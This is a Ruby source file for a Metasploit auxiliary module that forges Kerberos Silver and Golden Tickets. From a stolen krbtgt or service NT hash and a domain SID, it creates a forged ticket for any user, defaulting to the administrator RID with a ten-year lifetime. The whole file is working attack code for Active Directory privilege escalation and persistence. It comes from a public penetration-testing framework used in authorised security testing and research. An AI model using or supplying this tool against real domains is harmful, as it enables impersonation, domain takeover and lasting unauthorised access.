##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::Kerberos::Client
  include Msf::Exploit::Remote::Kerberos::Ticket

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Kerberos Silver/Golden Ticket Forging',
        'Description' => %q{
          This module forges a Kerberos ticket
        },
        'Author' => [
          'Benjamin Delpy', # Original Implementation
          'Dean Welch' # Metasploit Module
        ],
        'References' => [
          %w[URL https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it]
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [],
          'SideEffects' => [],
          'Reliability' => [],
          'AKA' => ['Silver Ticket', 'Golden Ticket', 'Ticketer']
        },
        'Actions' => [
          ['FORGE_SILVER', { 'Description' => 'Forge a Silver Ticket' } ],
          ['FORGE_GOLDEN', { 'Description' => 'Forge a Golden Ticket' } ],
        ],
        'DefaultAction' => 'FORGE_SILVER'
      )
    )

    register_options(
      [
        OptString.new('USER', [ true, 'The Domain User' ]),
        OptInt.new('USER_RID', [ true, "The Domain User's relative identifier(RID)", Rex::Proto::Kerberos::Pac::DEFAULT_ADMIN_RID]),
        OptString.new('NTHASH', [ true, 'The krbtgt/service nthash' ]),
        OptString.new('DOMAIN', [ true, 'The Domain (upper case) Ex: DEMO.LOCAL' ]),
        OptString.new('DOMAIN_SID', [ true, 'The Domain SID, Ex: S-1-5-21-1755879683-3641577184-3486455962']),
        OptString.new('SPN', [ false, 'The Service Principal Name (Only used for silver ticket)'], regex: %r{.*/.*}),
        OptInt.new('DURATION', [ false, 'Duration of the ticket in days', 3650])
      ]
    )
    deregister_options('RHOSTS', 'RPORT', 'Timeout')
  end

  SECS_IN_DAY = 60 * 60 * 24

  def run
    enc_key = [datastore['NTHASH']].pack('H*')
    start_time = Time.now
    end_time = start_time + SECS_IN_DAY * datastore['DURATION']

    case action.name
    when 'FORGE_SILVER'
      fail_with(Msf::Exploit::Failure::BadConfig, 'SPN must be set for forging a silver ticket') if datastore['SPN'].blank?
      sname = datastore['SPN'].split('/', 2)
      flags = Rex::Proto::Kerberos::Model::TicketFlags.from_flags(silver_ticket_flags)
    when 'FORGE_GOLDEN'
      sname = ['krbtgt', datastore['DOMAIN'].upcase]
      flags = Rex::Proto::Kerberos::Model::TicketFlags.from_flags(golden_ticket_flags)
    else
      fail_with(Msf::Module::Failure::BadConfig, "Invalid action #{action.name}")
    end
    create_ticket(
      enc_key: enc_key,
      start_time: start_time,
      end_time: end_time,
      sname: sname,
      flags: flags,
      domain: datastore['DOMAIN'],
      username: datastore['USER'],
      user_id: datastore['USER_RID'],
      domain_sid: datastore['DOMAIN_SID']
    )
  end

end
